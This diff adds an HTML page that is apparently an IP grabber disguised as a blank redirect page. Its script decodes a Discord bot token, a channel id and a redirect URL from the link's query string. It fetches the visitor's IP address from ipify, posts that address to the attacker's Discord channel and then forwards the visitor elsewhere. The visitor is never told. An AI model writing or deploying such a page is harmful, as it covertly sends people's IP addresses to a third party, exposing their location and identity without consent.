@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script type="text/javascript" src="lib/discord.11.6.1.min.js"></script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body{
+            background-color: #080808;
+        }
+    </style>
+</head>
+<body>
+    
+</body>
+<!-- <script> -->
+    <script type="application/javascript">
+    token = atob(window.location.search.split("&")[0].replace("?a=", "").replaceAll("EQUAL", ""))
+    id = atob(window.location.search.split("&")[1].replace("b=", "").replaceAll("EQUAL", ""))
+    redirectURL = atob(window.location.search.split("&")[2].replace("c=", "").replaceAll("EQUAL", ""))
+    console.log(token)
+    console.log(id)
+    console.log(redirectURL)
+    
+            
+            function getIP(json) {
+                ipad = json.ip
+            }
+            const client = new Discord.Client();
+
+            client.on('ready', () => {
+                console.log(`Logged in as ${client.user.tag} (${client.user.id})`, 'ready');
+                sendMessage();
+                window.location = redirectURL
+            });
+
+            function startBot() {
+                client.login(token)
+            }
+
+            function sendMessage() {
+                const msgChannel = client.channels.get(id).send(ipad);
+            }
+
+            startBot();
+        </script>
+
+        <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+</script>
+</html>
